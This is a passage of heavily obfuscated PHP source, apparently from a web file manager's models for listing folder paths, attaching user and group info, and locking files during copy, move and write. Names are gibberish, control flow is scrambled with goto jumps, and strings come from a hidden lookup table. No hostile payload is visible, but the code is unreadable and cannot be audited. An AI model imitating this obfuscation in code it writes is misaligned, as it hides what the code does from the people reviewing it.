=& $_SERVER[¹…ÕÄ]; if (!defined($bÍíõÍ„ÜÚ[448])) { return; } $eØ‚æå‘àñ = array(); goto E¦°» ´…²; E¦°» ´…²: foreach ($f¿×ÅŠ‘éñ as $d‡Ó¯¶¸¹) { if ($d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[398]] == self::TYPE_GROUP) { $eØ‚æå‘àñ[] = $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[390]]; } } if (!$eØ‚æå‘àñ) { return; } $fŞ™ŞĞ­î§ = array_to_keyvalue($f¿×ÅŠ‘éñ, $bÍíõÍ„ÜÚ[390]); goto Böô¨ğÊÅÔ; e¤òù®ÑôÈ: } public function groupPathDisplay(&$A‚ËÅÎÙÂô) { goto bÏ’‹ĞæÂ; c„©Ú×Õ·: $AŸß°‹íó² = $this->parentLevelArray($BÍš‘×ª¾[$eÊ±ßËÃå±[481]]); $a‚È„ÒğÆØ = $eÊ±ßËÃå±[33]; foreach ($AŸß°‹íó² as $BÏóñàÛ) { $cøÅì§İ¶§ = Model($eÊ±ßËÃå±[480])->getInfo($BÏóñàÛ); $a‚È„ÒğÆØ .= $cøÅì§İ¶§[$eÊ±ßËÃå±[84]][$eÊ±ßËÃå±[390]] . $eÊ±ßËÃå±[47]; } goto Cß‡¿ƒÁÒ¦; bÏ’‹ĞæÂ: $eÊ±ßËÃå± =& $_SERVER[¹…ÕÄ]; if ($A‚ËÅÎÙÂô[$eÊ±ßËÃå±[398]] != self::TYPE_GROUP) { return; } $BÍš‘×ª¾ = Model($eÊ±ßËÃå±[480])->getInfo($A‚ËÅÎÙÂô[$eÊ±ßËÃå±[478]]); goto c„©Ú×Õ·; Cß‡¿ƒÁÒ¦: $A‚ËÅÎÙÂô[$eÊ±ßËÃå±[482]] = $BÍš‘×ª¾[$eÊ±ßËÃå±[472]]; $A‚ËÅÎÙÂô[$eÊ±ßËÃå±[483]] = $BÍš‘×ª¾[$eÊ±ßËÃå±[481]]; $A‚ËÅÎÙÂô[$eÊ±ßËÃå±[484]] = $BÍš‘×ª¾[$eÊ±ßËÃå±[485]]; goto B©í¦µ—•Ú; B©í¦µ—•Ú: $A‚ËÅÎÙÂô[$eÊ±ßËÃå±[486]] = $a‚È„ÒğÆØ . $BÍš‘×ª¾[$eÊ±ßËÃå±[84]][$eÊ±ßËÃå±[390]]; goto C¦éÂãÖ¨¥; C¦éÂãÖ¨¥: } protected function _listAppendPath(&$F©šÑÖæîË) { goto fŠ‡·ÛÆ¨‚; eİğñîÀÊ: unset($c»›¼÷í¶); return $F©šÑÖæîË; goto FñÌÓÔæ‚»; fŠ‡·ÛÆ¨‚: $F²è«‚¸Ş =& $_SERVER[¹…ÕÄ]; static $D®’¨Şºß = array(); $AŠ¤Î‚´Ä = array(); goto A¥èë«ó¾ê; A¥èë«ó¾ê: $cç¥ïñŒÜ¿ = array(); foreach ($F©šÑÖæîË as &$c»›¼÷í¶) { $FßÚóä¿ = $c»›¼÷í¶[$F²è«‚¸Ş[397]] == $F²è«‚¸Ş[86]; if ($FßÚóä¿) { $D®’¨Şºß[$c»›¼÷í¶[$F²è«‚¸Ş[390]]] = $c»›¼÷í¶[$F²è«‚¸Ş[28]]; } if (isset($cç¥ïñŒÜ¿[$c»›¼÷í¶[$F²è«‚¸Ş[481]]])) { continue; } $cç¥ïñŒÜ¿[$c»›¼÷í¶[$F²è«‚¸Ş[481]]] = !0; $a±ÌŞÄ‚Ÿ§ = $this->parentLevelArray($c»›¼÷í¶[$F²è«‚¸Ş[481]]); foreach ($a±ÌŞÄ‚Ÿ§ as $bÏåÜ¬±ª => $Eå©¿Šù´) { if ($bÏåÜ¬±ª != 0 && !isset($D®’¨Şºß[$Eå©¿Šù´])) { $AŠ¤Î‚´Ä[] = $Eå©¿Šù´; } } } unset($c»›¼÷í¶); goto CöèŒ³¨Ö¸; CöèŒ³¨Ö¸: $AŠ¤Î‚´Ä = array_unique($AŠ¤Î‚´Ä); if (count($AŠ¤Î‚´Ä) > 0) { $aó’ñ¬õ© = array($F²è«‚¸Ş[404] => array($F²è«‚¸Ş[405], $AŠ¤Î‚´Ä)); if (count($AŠ¤Î‚´Ä) == 1) { $BÜÈ¯™¦¸Á = $this->sourceInfo($AŠ¤Î‚´Ä[0]); $c†é‹äï¾‚ = is_array($BÜÈ¯™¦¸Á) ? array($BÜÈ¯™¦¸Á) : !1; } else { $c†é‹äï¾‚ = $this->field($F²è«‚¸Ş[487])->where($aó’ñ¬õ©)->select(); } if (!$c†é‹äï¾‚) { $c†é‹äï¾‚ = array(); } foreach ($c†é‹äï¾‚ as $A«Ê†Â¦â–) { $D®’¨Şºß[$A«Ê†Â¦â–[$F²è«‚¸Ş[390]]] = $A«Ê†Â¦â–[$F²è«‚¸Ş[28]]; } } $F£ÆÍ¥ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto eÎÉ™¯ªÁ«; eÎÉ™¯ªÁ«: $A‡…ö——ó¹ = array(); $f÷²ç×Íë = array(); foreach ($F©šÑÖæîË as &$c»›¼÷í¶) { goto eã“ÍÍğ; còƒÊÒ øŸ: $c»›¼÷í¶[$F²è«‚¸Ş[489]] = str_replace($F²è«‚¸Ş[490], $F²è«‚¸Ş[8], $eø·Êˆø‡); $BÓ’ÛñÉê„ = trim($c»›¼÷í¶[$F²è«‚¸Ş[489]], $F²è«‚¸Ş[8]); if ($c»›¼÷í¶[$F²è«‚¸Ş[472]] == $F²è«‚¸Ş[491] && $BÓ’ÛñÉê„) { $c»›¼÷í¶[$F²è«‚¸Ş[28]] = $BÓ’ÛñÉê„; } goto B‚„‚ÊÄîÜ; B‚„‚ÊÄîÜ: if (intval($c»›¼÷í¶[$F²è«‚¸Ş[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($c»›¼÷í¶, $a±ÌŞÄ‚Ÿ§, $F£ÆÍ¥); } goto d…ßÃÅÌÁ; eã“ÍÍğ: $AäÊáë§ƒ = $c»›¼÷í¶[$F²è«‚¸Ş[481]]; if (isset($f÷²ç×Íë[$AäÊáë§ƒ])) { $eø·Êˆø‡ = $A‡…ö——ó¹[$AäÊáë§ƒ]; } else { $a±ÌŞÄ‚Ÿ§ = $this->parentLevelArray($c»›¼÷í¶[$F²è«‚¸Ş[481]]); $DÄ“†áÈğ = $F²è«‚¸Ş[488] . $c»›¼÷í¶[$F²è«‚¸Ş[398]] . $F²è«‚¸Ş[434] . $c»›¼÷í¶[$F²è«‚¸Ş[478]]; if ($A‡…ö——ó¹[$DÄ“†áÈğ]) { $eø·Êˆø‡ = $A‡…ö——ó¹[$DÄ“†áÈğ]; } else { $eø·Êˆø‡ = $this->_listAppendPathRoot($c»›¼÷í¶, $a±ÌŞÄ‚Ÿ§); $A‡…ö——ó¹[$DÄ“†áÈğ] = $eø·Êˆø‡; } foreach ($a±ÌŞÄ‚Ÿ§ as $bÏåÜ¬±ª => $Eå©¿Šù´) { if ($bÏåÜ¬±ª == 0 && $eø·Êˆø‡ && $c»›¼÷í¶[$F²è«‚¸Ş[398]] == self::TYPE_GROUP) { continue; } if (isset($D®’¨Şºß[$Eå©¿Šù´])) { $eø·Êˆø‡ .= $D®’¨Şºß[$Eå©¿Šù´] . $F²è«‚¸Ş[8]; } } if ($a±ÌŞÄ‚Ÿ§) { $eø·Êˆø‡ .= $c»›¼÷í¶[$F²è«‚¸Ş[28]]; } $A‡…ö——ó¹[$AäÊáë§ƒ] = $eø·Êˆø‡; } if ($c»›¼÷í¶[$F²è«‚¸Ş[397]]) { $eø·Êˆø‡ .= $F²è«‚¸Ş[8]; } goto còƒÊÒ øŸ; d…ßÃÅÌÁ: } goto eİğñîÀÊ; FñÌÓÔæ‚»: } private function _listAppendPathRecycle(&$f…¥‚Ó½¢¶, $DôóÅõ„—¿, $D†š »ÆÌ) { goto E£°ñ­‡ŒÙ; E£°ñ­‡ŒÙ: $b‡¿óªÃœ‰ =& $_SERVER[¹…ÕÄ]; if (!in_array($D†š »ÆÌ, $DôóÅõ„—¿) && $f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[390]] != $D†š »ÆÌ) { return; } $AÕêÑ†”òÏ = explode($b‡¿óªÃœ‰[8], trim($f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[489]], $b‡¿óªÃœ‰[8])); goto cæå£®„Ø; cë›ã‚×Î : if ($f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[390]] == $D†š »ÆÌ) { $f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[481]] = $b‡¿óªÃœ‰[493]; $f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[472]] = $b‡¿óªÃœ‰[491]; $f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[28]] = LNG($b‡¿óªÃœ‰[492]); } $f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[494]] = $b‡¿óªÃœ‰[495]; goto aãİÇÌñô; cæå£®„Ø: $e˜İÃêÚ = implode($b‡¿óªÃœ‰[8], array_slice($AÕêÑ†”òÏ, 2)); $f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[489]] = $b‡¿óªÃœ‰[8] . LNG($b‡¿óªÃœ‰[492]) . $b‡¿óªÃœ‰[8] . ltrim($e˜İÃêÚ, $b‡¿óªÃœ‰[8]); $f…¥‚Ó½¢¶[$b‡¿óªÃœ‰[481]] = $b‡¿óªÃœ‰[493] . implode($b‡¿óªÃœ‰[47], array_slice($DôóÅõ„—¿, 1)) . $b‡¿óªÃœ‰[47]; goto cë›ã‚×Î ; aãİÇÌñô: } protected function _listAppendPathRoot(&$CŞ¸İ÷í¯¹, $A½²¬§Ù°¯) { $A›àìÄäå‰ =& $_SERVER[¹…ÕÄ]; $BŸíâ¼Ş´¨ = $A›àìÄäå‰[33]; if ($CŞ¸İ÷í¯¹[$A›àìÄäå‰[398]] == self::TYPE_USER) { if (defined($A›àìÄäå‰[448]) && $CŞ¸İ÷í¯¹[$A›àìÄäå‰[478]] == USER_ID) { $BŸíâ¼Ş´¨ = LNG($A›àìÄäå‰[496]); if (!$A½²¬§Ù°¯) { $CŞ¸İ÷í¯¹[$A›àìÄäå‰[28]] = $BŸíâ¼Ş´¨; } } else { $B×Í¥£ÜÊ = Model($A›àìÄäå‰[497])->getInfoSimple($CŞ¸İ÷í¯¹[$A›àìÄäå‰[478]]); $BŸíâ¼Ş´¨ = LNG($A›àìÄäå‰[498]) . $A›àìÄäå‰[159] . $B×Í¥£ÜÊ[$A›àìÄäå‰[28]] . $A›àìÄäå‰[499]; } } else { if ($CŞ¸İ÷í¯¹[$A›àìÄäå‰[398]] == self::TYPE_GROUP) { $B×Í¥£ÜÊ = Model($A›àìÄäå‰[480])->getInfoSimple($CŞ¸İ÷í¯¹[$A›àìÄäå‰[478]]); $BŸíâ¼Ş´¨ = $B×Í¥£ÜÊ[$A›àìÄäå‰[28]]; } else { if ($CŞ¸İ÷í¯¹[$A›àìÄäå‰[398]] == self::TYPE_SYSTEM) { $BŸíâ¼Ş´¨ = $A›àìÄäå‰[500]; } } } $BŸíâ¼Ş´¨ = $BŸíâ¼Ş´¨ ? $A›àìÄäå‰[8] . $BŸíâ¼Ş´¨ . $A›àìÄäå‰[8] : $A›àìÄäå‰[8]; return $BŸíâ¼Ş´¨; } protected function _listAppendUser(&$dÓÊ®ã£½) { goto D¸ğè´¤ÁÚ; A½‰Ç‹µ˜¼: unset($d…óÃ ‡Í); goto cîÁÎË¨Ãİ; E†‚¿‹Ô›´: $aß—›²¥  = array_merge($cÓÈ‰ó½£Ó, $b×Ô¥¯ôŠÓ); $c°À’¡Óóì = Model($c­É†é²è®[501])->userListInfo($aß—›²¥ ); foreach ($dÓÊ®ã£½ as &$d…óÃ ‡Í) { $EÆ‡å±™Ë© = $d…óÃ ‡Í[$c­É†é²è®[426]]; $d…óÃ ‡Í[$c­É†é²è®[426]] = $c°À’¡Óóì[$EÆ‡å±™Ë©] ? $c°À’¡Óóì[$EÆ‡å±™Ë©] : !1; $EÆ‡å±™Ë© = $d…óÃ ‡Í[$c­É†é²è®[428]]; $d…óÃ ‡Í[$c­É†é²è®[428]] = $c°À’¡Óóì[$EÆ‡å±™Ë©] ? $c°À’¡Óóì[$EÆ‡å±™Ë©] : !1; if (isset($d…óÃ ‡Í[$c­É†é²è®[439]]) && $d…óÃ ‡Í[$c­É†é²è®[439]][$c­É†é²è®[502]]) { $E”¹ùĞî²Ú = $GLOBALS[$c­É†é²è®[6]][$c­É†é²è®[87]][$c­É†é²è®[503]]; if ($d…óÃ ‡Í[$c­É†é²è®[439]][$c­É†é²è®[504]] <= time() - $E”¹ùĞî²Ú) { $this->metaSet($d…óÃ ‡Í[$c­É†é²è®[390]], $c­É†é²è®[502], null); $this->metaSet($d…óÃ ‡Í[$c­É†é²è®[390]], $c­É†é²è®[504], null); unset($d…óÃ ‡Í[$c­É†é²è®[439]][$c­É†é²è®[502]]); continue; } $fÒ¦ä¥Ù„ = $d…óÃ ‡Í[$c­É†é²è®[439]][$c­É†é²è®[502]]; $d…óÃ ‡Í[$c­É†é²è®[439]][$c­É†é²è®[505]] = Model($c­É†é²è®[501])->getInfoSimpleOuter($fÒ¦ä¥Ù„); } } goto A½‰Ç‹µ˜¼; D¸ğè´¤ÁÚ: $c­É†é²è® =& $_SERVER[¹…ÕÄ]; $cÓÈ‰ó½£Ó = array_to_keyvalue($dÓÊ®ã£½, $c­É†é²è®[33], $c­É†é²è®[426]); $b×Ô¥¯ôŠÓ = array_to_keyvalue($dÓÊ®ã£½, $c­É†é²è®[33], $c­É†é²è®[428]); goto E†‚¿‹Ô›´; cîÁÎË¨Ãİ: } public function parentLevelArray($a’ßª¢È´å) { $cß®ÍåÕˆŠ =& $_SERVER[¹…ÕÄ]; $a’ßª¢È´å = explode($cß®ÍåÕˆŠ[47], trim($a’ßª¢È´å, $cß®ÍåÕˆŠ[47])); return array_remove_value($a’ßª¢È´å, $cß®ÍåÕˆŠ[491]); } public function listAll($Aâùƒ¾åæ) { goto AÏ–õàäÈ‡; DËù‰ê: $this->_listAppendAuth($bÁÓ™ñèÖ); $this->_listAppendUser($bÁÓ™ñèÖ); $this->_listAppendPath($bÁÓ™ñèÖ); goto AÉó£Òµ›ˆ; AÏ–õàäÈ‡: $A˜ˆÑÒËñ =& $_SERVER[¹…ÕÄ]; $fö¤ñ˜Åˆƒ = $this->sourceInfo($Aâùƒ¾åæ); $cµ¾ä×ÓÇö = array($A˜ˆÑÒËñ[506] => array($A˜ˆÑÒËñ[507], $fö¤ñ˜Åˆƒ[$A˜ˆÑÒËñ[481]] . $Aâùƒ¾åæ . $A˜ˆÑÒËñ[508]), $A˜ˆÑÒËñ[509] => 0); goto E„š÷Ğ¨¡É; E„š÷Ğ¨¡É: $e›™æÄ²î = $A˜ˆÑÒËñ[510]; $Cö…¿·å¢ß = "\114\x45\x46\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\x5f\146\x69\154\145\x20\146\x69\x6c\145\40\x6f\156\40\163\x6f\x75\x72\x63\145\x2e\x66\151\154\x65\x49\x44\x20\75\40\x66\x69\154\145\56\x66\151\154\x65\111\104"; $bÁÓ™ñèÖ = $this->alias($A˜ˆÑÒËñ[511])->field($e›™æÄ²î)->where($cµ¾ä×ÓÇö)->join($Cö…¿·å¢ß)->select(); goto DËù‰ê; AÉó£Òµ›ˆ: $bÁÓ™ñèÖ = array_to_keyvalue($bÁÓ™ñèÖ, $A˜ˆÑÒËñ[390]); $cÅ‹µ³˜ì = "\x2f{$fö¤ñ˜Åˆƒ[$A˜ˆÑÒËñ[28]]}\x2f"; $cÅ‹µ³˜ì = $cÅ‹µ³˜ì == $A˜ˆÑÒËñ[490] ? $A˜ˆÑÒËñ[8] : $cÅ‹µ³˜ì; goto c…ÑÑ¹ÈŠŠ; c…ÑÑ¹ÈŠŠ: $D” Í‰Æõ = array(); foreach ($bÁÓ™ñèÖ as $D¦ÒË„Ï¢ => $fÆéƒ£ã…) { goto DÏ•¹¶«™; a—‚šííµ¾: for ($bĞ”Ø›ì = 0; $bĞ”Ø›ì < count($A„×§¸“¼); $bĞ”Ø›ì++) { $b«£ñËÓŠ .= $bÁÓ™ñèÖ[$A„×§¸“¼[$bĞ”Ø›ì]][$A˜ˆÑÒËñ[28]] . $A˜ˆÑÒËñ[8]; } $b«£ñËÓŠ .= $fÆéƒ£ã…[$A˜ˆÑÒËñ[28]]; if ($fÆéƒ£ã…[$A˜ˆÑÒËñ[397]]) { $b«£ñËÓŠ .= $A˜ˆÑÒËñ[8]; } goto DğÕÙ­„£¤; c±×ìòÙ™é: if (!$fÆéƒ£ã…[$A˜ˆÑÒËñ[397]]) { $A—–¿ŒšøŠ[$A˜ˆÑÒËñ[441]] = $fÆéƒ£ã…[$A˜ˆÑÒËñ[441]]; $A—–¿ŒšøŠ[$A˜ˆÑÒËñ[85]] = $fÆéƒ£ã…[$A˜ˆÑÒËñ[75]]; } $D” Í‰Æõ[] = $A—–¿ŒšøŠ; goto AÏšœ÷ÛÈŠ; DğÕÙ­„£¤: $b«£ñËÓŠ = str_replace($A˜ˆÑÒËñ[490], $A˜ˆÑÒËñ[8], $b«£ñËÓŠ); $b«£ñËÓŠ = str_replace($A˜ˆÑÒËñ[490], $A˜ˆÑÒËñ[8], $b«£ñËÓŠ); $A—–¿ŒšøŠ = array($A˜ˆÑÒËñ[408] => str_replace($A˜ˆÑÒËñ[490], $A˜ˆÑÒËñ[8], $b«£ñËÓŠ), $A˜ˆÑÒËñ[512] => intval($fÆéƒ£ã…[$A˜ˆÑÒËñ[397]]), $A˜ˆÑÒËñ[84] => $this->pathInfoFilter($fÆéƒ£ã…)); goto c±×ìòÙ™é; DÏ•¹¶«™: $A„×§¸“¼ = $this->parentLevelArray($fÆéƒ£ã…[$A˜ˆÑÒËñ[481]]); array_shift($A„×§¸“¼); $b«£ñËÓŠ = $cÅ‹µ³˜ì; goto a—‚šííµ¾; AÏšœ÷ÛÈŠ: } return $D” Í‰Æõ; goto cŒº¨„Êöã; cŒº¨„Êöã: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($fÍòã…õÃñ) { goto e»ÁÈ¹™†×; E¿»¶¾Ü™: $this->_lockEvent($fÍòã…õÃñ, array($Fò·È¼ó[516], $Fò·È¼ó[517]), $f¾ÍåÙÖ–Ó); $this->_lockCheckEnd($Fò·È¼ó[513], $fÍòã…õÃñ); goto Cå”ä’éÎ¤; e»ÁÈ¹™†×: $Fò·È¼ó =& $_SERVER[¹…ÕÄ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Fò·È¼ó[513], $fÍòã…õÃñ); goto dğÉáêÇ‘•; dğÉáêÇ‘•: $f¾ÍåÙÖ–Ó = 1; $this->_lockEvent($fÍòã…õÃñ, array($Fò·È¼ó[514], $Fò·È¼ó[515]), $f¾ÍåÙÖ–Ó); $this->_lockParent($fÍòã…õÃñ, array($Fò·È¼ó[515]), $f¾ÍåÙÖ–Ó); goto E¿»¶¾Ü™; Cå”ä’éÎ¤: } public function lockCopyEnd($e†™›ËƒÏ¨) { $e„÷•¡ù½ =& $_SERVER[¹…ÕÄ]; if (!$this->allowLock()) { return; } $dÂÁÒ»œŞÉ = 0; $this->_lockEvent($e†™›ËƒÏ¨, array($e„÷•¡ù½[514], $e„÷•¡ù½[515]), $dÂÁÒ»œŞÉ); $this->_lockParent($e†™›ËƒÏ¨, array($e„÷•¡ù½[515]), $dÂÁÒ»œŞÉ); $this->_lockEvent($e†™›ËƒÏ¨, array($e„÷•¡ù½[516], $e„÷•¡ù½[517]), $dÂÁÒ»œŞÉ); } public function lockWriteStart($eëÒ‡ƒó¬Ä, $d¿²Âä–Ä = '') { goto e†åßùÖÛ; e†åßùÖÛ: $B¼Ä“ó«µ› =& $_SERVER[¹…ÕÄ]; if (!$this->allowLock()) { return; } $this->_lockCheck($B¼Ä“ó«µ›[514], $eëÒ‡ƒó¬Ä); goto EĞ‚ŠÇè´; d‡™Ò¯: $this->_lockParent($eëÒ‡ƒó¬Ä, array($B¼Ä“ó«µ›[513], $B¼Ä“ó«µ›[515]), $Cä™´ĞŠ†º); $this->_lockCheckEnd($B¼Ä“ó«µ›[514], $eëÒ‡ƒó¬Ä); goto a‰š£Ğ£†§; EĞ‚ŠÇè´: $Cä™´ĞŠ†º = 1; $this->_lockKey($B¼Ä“ó«µ›[518] . $eëÒ‡ƒó¬Ä . $B¼Ä“ó«µ›[94] . $d¿²Âä–Ä, $Cä™´ĞŠ†º); $this->_lockEvent($eëÒ‡ƒó¬Ä, array($B¼Ä“ó«µ›[513], $B¼Ä“ó«µ›[515]), $Cä™´ĞŠ†º); goto d‡™Ò¯; a‰š£Ğ£†§: } public function lockWriteEnd($Eî‹ùŒçÆ, $e›·°‚­ = '') { $E¹ñ³‰æ˜ä =& $_SERVER[¹…ÕÄ]; if (!$this->allowLock()) { return; } $F¬·‘†§Šò = 0; $this->_lockKey($E¹ñ³‰æ˜ä[518] . $Eî‹ùŒçÆ . $E¹ñ³‰æ˜ä[94] . $e›·°‚­, $F¬·‘†§Šò); $this->_lockEvent($Eî‹ùŒçÆ, array($E¹ñ³‰æ˜ä[513], $E¹ñ³‰æ˜ä[515]), $F¬·‘†§Šò); $this->_lockParent($Eî‹ùŒçÆ, array($E¹ñ³‰æ˜ä[513], $E¹ñ³‰æ˜ä[515]), $F¬·‘†§Šò); } public function lockMoveStart($eÓâ×Ôà¯) { goto d¶Ñä„™¦‡; fë·ÒÅëƒ«: $aí‚¦Š‘ğ = 1; $this->_lockKey($FØÚÓ”Ö›‘[519] . $eÓâ×Ôà¯, $aí‚¦Š‘ğ); $this->_lockEvent($eÓâ×Ôà¯, array($FØÚÓ”Ö›‘[513], $FØÚÓ”Ö›‘[514]), $aí‚¦Š‘ğ); goto eÍ¸ê‹îè”; d¶Ñä„™¦‡: $FØÚÓ”Ö›‘ =& $_SERVER[¹…ÕÄ]; if (!$this->allowLock()) { return; } $this->_lockCheck($FØÚÓ”Ö›‘[515], $eÓâ×Ôà¯); goto fë·ÒÅëƒ«; eÍ¸ê‹îè”: $this->_lockParent($eÓâ×Ôà¯, array($FØÚÓ”Ö›‘[513], $FØÚÓ”Ö›‘[515]), $aí‚¦Š‘ğ); $this->_lockEvent($eÓâ×Ôà¯, array($FØÚÓ”Ö›‘[520], $FØÚÓ”Ö›‘[516], $FØÚÓ”Ö›‘[517]), $aí‚¦Š‘ğ); $this->_lockCheckEnd($FØÚÓ”Ö›‘[515], $eÓâ×Ôà¯); goto Dìø×ÛÙÌ¦; Dìø×ÛÙÌ¦: } public function lockMoveEnd($Dá³ÍÕÂ) { goto dËîÏí‰³É; FÒÔ™†°: $this->_lockKey($Bó“ºñÌÕ[519] . $Dá³ÍÕÂ, $f¼’ğªõÅÇ); $this->_lockEvent($Dá³ÍÕÂ, array($Bó“ºñÌÕ[513], $Bó“ºñÌÕ[514]), $f¼’ğªõÅÇ); $this->_lockParent($Dá³ÍÕÂ, array($Bó“ºñÌÕ[513], $Bó“ºñÌÕ[515]), $f¼’ğªõÅÇ); goto EÔ›ª¦“•Ò; dËîÏí‰³É: $Bó“ºñÌÕ =& $_SERVER[¹…ÕÄ]; if (!$this->allowLock()) { return; } $f¼’ğªõÅÇ = 0; goto FÒÔ™†°; EÔ›ª¦“•Ò: $this->_lockEvent($Dá³ÍÕÂ, array($Bó“ºñÌÕ[520], $Bó“ºñÌÕ[516], $Bó“ºñÌÕ[517]), $f¼’ğªõÅÇ); goto BìŠ÷§…ºÈ; BìŠ÷§…ºÈ: } private function _lockCheck($C–®¥Ùƒ°, $E÷óêšì´–) { goto BĞ¥ª‡š¢¶; e‘‡Ñİ½¾¨: $a… ˆï‘³Œ = array_reverse($this->parentLevelArray($B…‚á‰â˜¥[$e†Œ¼»Æƒ’[481]])); foreach ($a… ˆï‘³Œ as $eÌÖáĞ¿Ğ) { $D¨­°ÎÎÊ¦ = $C–®¥Ùƒ° . $e†Œ¼»Æƒ’[522] . $eÌÖáĞ¿Ğ; if (CacheLock::lockGet($e†Œ¼»Æƒ’[523] . $D¨­°ÎÎÊ¦)) { $B…‚á‰â˜¥ = $this->sourceInfo($eÌÖáĞ¿Ğ); CacheLock::setErrorMsg($e†Œ¼»Æƒ’[159] . htmlspecialchars($B…‚á‰â˜¥[$e†Œ¼»Æƒ’[28]]) . $e†Œ¼»Æƒ’[499] . $EºÀß”Ã™); $this->_lockKey($D¨­°ÎÎÊ¦, 1); $this->_lockKey($D¨­°ÎÎÊ¦, 0); } } goto fã‹›ã¨ëë; d¹Çº¯ŞÓË: $this->_lockTimeStart[$D¨­°ÎÎÊ¦] = timeFloat(); if (!is_array($B…‚á‰â˜¥)) { return; } $EºÀß”Ã™ = LNG($e†Œ¼»Æƒ’[521]); goto fÕ’¡Ó›§÷; fÕ’¡Ó›§÷: CacheLock::setErrorMsg($e†Œ¼»Æƒ’[159] . htmlspecialchars($B…‚á‰â˜¥[$e†Œ¼»Æƒ’[28]]) . $e†Œ¼»Æƒ’[499] . $EºÀß”Ã™); $this->_lockKey($D¨­°ÎÎÊ¦, 1); $this->_lockKey($D¨­°ÎÎÊ¦, 0); goto e‘‡Ñİ½¾¨; BĞ¥ª‡š¢¶: $e†Œ¼»Æƒ’ =& $_SERVER[¹…ÕÄ]; $B…‚á‰â˜¥ = $this->sourceInfo($E÷óêšì´–); $D¨­°ÎÎÊ¦ = $C–®¥Ùƒ° . $e†Œ¼»Æƒ’[94] . $E÷óêšì´–; goto d¹Çº¯ŞÓË; fã‹›ã¨ëë: } private function _lockCheckEnd($C«ì¦Å¶éæ, $e‰‰ª©¬äô) { goto d„À—©ù÷®; C–÷­…ŒÎÇ: if (!isset($this->_lockTimeStart[$CĞ·˜àæÁÂ])) { return; } $AÒ’«³Ùøù = timeFloat() - $this->_lockTimeStart[$CĞ·˜àæÁÂ]; unset($this->_lockTimeStart[$CĞ·˜àæÁÂ]); goto D¥‡‚ˆïïË; d„À—©ù÷®: $Eñ¹±„Å¹ =& $_SERVER[¹…ÕÄ]; $CĞ·˜àæÁÂ = $C«ì¦Å¶éæ . $Eñ¹±„Å¹[94] . $e‰‰ª©¬äô; CacheLock::setErrorMsg($Eñ¹±„Å¹[373]); goto C–÷­…ŒÎÇ; D¥‡‚ˆïïË: if ($AÒ’«³Ùøù > 0.5) { unset(self::$cacheSourceInfo[$Eñ¹±„Å¹[432] . $e‰‰ª©¬äô]); } $B­ÕĞ¿Àğ = $this->sourceInfo($e‰‰ª©¬äô); if (!$B­ÕĞ¿Àğ) { show_json(LNG($Eñ¹±„Å¹[104]), !1); } goto dÇ¶‹”®–¡; dÇ¶‹”®–¡: } private function _lockParent($c´ÂÕåÚõî, $aìñÂÂŞ‚Ï, $D’ „–´·¶) { if (!$this->autoLockSet) { return; } $báİ‘‚ÙğÔ = $this->sourceInfo($c´ÂÕåÚõî); if (!is_array($báİ‘‚ÙğÔ)) { return; } $B–ÈµÄí° = array_reverse($this->parentLevelArray($báİ‘‚ÙğÔ[$_SERVER[¹…ÕÄ][481]])); foreach ($B–ÈµÄí° as $Aåïœçâ†‘) { $this->_lockEvent($Aåïœçâ†‘, $aìñÂÂŞ‚Ï, $D’ „–´·¶); } } private function _lockEvent($dØºÒ©ï®¾, $FêóÕ›É¹ê, $DÏÎ­È¹»æ) { $añ¤‰óÜõĞ =& $_SERVER[¹…ÕÄ]; if (!$this->autoLockSet) { return; } foreach ($FêóÕ›É¹ê as $cá¦¹˜…Å) { $e¿²ä¿¡Úä = $cá¦¹˜…Å . $añ¤‰óÜõĞ[94] . $dØºÒ©ï®¾; if ($DÏÎ­È¹»æ && CacheLock::lockGet($añ¤‰óÜõĞ[523] . $e¿²ä¿¡Úä)) { continue; } $this->_lockKey($e¿²ä¿¡Úä, $DÏÎ­È¹»æ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($c“ô³æÖ¿½, $F£¶ß‚Š³Î = 1) { $cªÆÙ›æ¼ = $_SERVER[¹…ÕÄ][523] . md5($c“ô³æÖ¿½); if ($F£¶ß‚Š³Î) { if (isset(self::$_lockItemArr[$cªÆÙ›æ¼])) { return; } self::$_lockItemArr[$cªÆÙ›æ¼] = 1; CacheLock::lock($cªÆÙ›æ¼, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$cªÆÙ›æ¼])) { return; } unset(self::$_lockItemArr[$cªÆÙ›æ¼]); CacheLock::unlock($cªÆÙ›æ¼); } } public function isParentOf($båøÕÎµÎ, $c©æñÍ£ãÇ) { goto aøÍ‡Û‚; aøÍ‡Û‚: $a¸µ­àùßé =& $_SERVER[¹…ÕÄ]; $fí‚ãçœâŸ = $this->sourceInfo($båøÕÎµÎ); $DªéÕ»ÉŠ = $this->sourceInfo($c©æñÍ£ãÇ); goto A‚İ„Ö’ª‡; A‚İ„Ö’ª‡: $a¼”‡±Æô = $fí‚ãçœâŸ[$a¸µ­àùßé[481]] . $fí‚ãçœâŸ[$a¸µ­àùßé[390]] . $a¸µ­àùßé[47]; $E”·¨Œ…Âê = $DªéÕ»ÉŠ[$a¸µ­àùßé[481]] . $DªéÕ»ÉŠ[$a¸µ­àùßé[390]] . $a¸µ­àùßé[47]; $c´İÔôŠ  = strpos($E”·¨Œ…Âê, $a¼”‡±Æô) === 0; goto Fˆƒ¹ÏÅïõ; Fˆƒ¹ÏÅïõ: return $c´İÔôŠ ; goto c¥´„îî; c¥´„îî: } private $targetIsDelete = 0; public function copy($bŸÊèÃÄÙ, $b„‚ÕË„, $b»ñº…Õ‰‡ = REPEAT_REPLACE, $E×·ƒµ¬ù = '') { goto 